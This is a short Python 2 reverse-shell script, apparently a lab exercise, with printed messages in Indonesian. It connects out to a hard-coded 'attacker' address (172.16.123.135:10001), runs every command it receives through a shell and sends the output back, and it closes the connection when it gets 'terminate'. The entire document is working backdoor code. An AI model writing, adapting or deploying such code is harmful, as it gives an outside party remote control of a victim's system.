import socket
import subprocess

def connecToAttacker():

    connectAttacker = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connectAttacker.connect(("172.16.123.135",10001))

    while True:
        command = connectAttacker.recv(1024)
        print "\n" + "Perintah dari Attacker: " + command + "\n"
        if "terminate" in command:
            print "\n" + "Perintah " + command +" :untuk mengakhiri komunikasi" + "\n"
            print "connection closed" + "\n"
            connectAttacker.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            connectAttacker.send(CMD.stdout.read())
            connectAttacker.send(CMD.stderr.read())
            
def main():
    connecToAttacker()

if __name__ == main():
    main()
